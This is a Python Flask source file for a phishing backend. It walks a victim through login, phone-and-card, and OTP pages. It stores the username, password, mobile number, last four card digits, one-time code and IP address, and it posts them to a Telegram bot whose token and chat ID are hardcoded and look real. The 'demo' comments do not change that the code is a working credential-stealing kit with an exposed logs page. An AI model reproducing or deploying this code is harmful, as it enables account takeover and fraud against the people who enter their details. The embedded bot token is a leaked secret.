import os, json, time, requests
from flask import Flask, render_template, request, redirect, url_for, send_from_directory, flash

# === CONFIG ===
BOT_TOKEN = "8344758045:AAH6ZlZ_bg3ZEVcn95WB20gvl5DcgGkQxzQ"   # optional: put your Telegram bot token here
CHAT_ID = "5015304029 "     # optional: put your Telegram chat id here
# ==============
UPLOAD_FOLDER = "uploads"
LOGFILE = "logs.json"
STATEFILE = "state.json"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}" if BOT_TOKEN else None

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
if not os.path.exists(LOGFILE):
    with open(LOGFILE, "w") as f:
        json.dump([], f, indent=2)

app = Flask(__name__)
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
app.secret_key = os.environ.get("FLASK_SECRET", "demo-secret")

def save_log(entry):
    with open(LOGFILE,"r+") as f:
        try:
            data = json.load(f)
        except:
            data = []
        data.insert(0, entry)
        f.seek(0)
        json.dump(data, f, indent=2)
        f.truncate()

def send_to_telegram(text):
    if not TELEGRAM_API:
        return
    try:
        requests.post(f"{TELEGRAM_API}/sendMessage", data={
            "chat_id": CHAT_ID,
            "text": text,
            "parse_mode": "HTML"
        }, timeout=10)
    except Exception as e:
        print("Telegram error:", e)

@app.route("/", methods=["GET","POST"])
def index():
    if request.method == "POST":
        username = request.form.get("username","").strip()
        password = request.form.get("password","").strip()
        # store state for subsequent steps (demo only)
        state = {"username": username, "password": password, "time": int(time.time())}
        with open(STATEFILE,"w") as f:
            json.dump(state, f)
        return redirect(url_for("verify"))
    return render_template("index.html")

@app.route("/verify", methods=["GET","POST"])
def verify():
    if request.method == "POST":
        mobile = request.form.get("mobile","").strip()
        last4 = request.form.get("last4","").strip()
        try:
            with open(STATEFILE,"r") as f:
                state = json.load(f)
        except:
            state = {}
        state.update({"mobile": mobile, "last4": last4})
        with open(STATEFILE,"w") as f:
            json.dump(state, f)
        # go to OTP step (demo: we won't send real SMS)
        return redirect(url_for("otp"))
    return render_template("verify.html")

@app.route("/otp", methods=["GET","POST"])
def otp():
    if request.method == "POST":
        otp = request.form.get("otp","").strip()
        try:
            with open(STATEFILE,"r") as f:
                state = json.load(f)
        except:
            state = {}
        human_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        entry = {
            "time": human_time,
            "username": state.get("username"),
            "password": state.get("password"),
            "mobile": state.get("mobile"),
            "last4": state.get("last4"),
            "otp_entered": otp,
            "source_ip": request.remote_addr
        }
        save_log(entry)
        # send to telegram if configured
        text = (
            f"<b>DEMO CAPTURE</b>\nTime: {entry['time']}\n"
            f"Username: <code>{entry['username']}</code>\nPassword: <code>{entry['password']}</code>\n"
            f"Mobile: {entry.get('mobile')}\nLast4: {entry.get('last4')}\nOTP: {otp}"
        )
        send_to_telegram(text)
        # demo behavior: OTP "0000" => success (returns to start), otherwise go to error
        if otp == "0000":
            flash("Demo: verification succeeded (fake).")
            return redirect(url_for("index"))
        else:
            return redirect(url_for("error"))
    return render_template("otp.html")

@app.route("/error")
def error():
    return render_template("error.html")

@app.route("/logs")
def logs():
    with open(LOGFILE,"r") as f:
        data = json.load(f)
    return render_template("logs.html", logs=data)

@app.route("/uploads/<path:filename>")
def uploaded_file(filename):
    return send_from_directory(app.config["UPLOAD_FOLDER"], filename)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
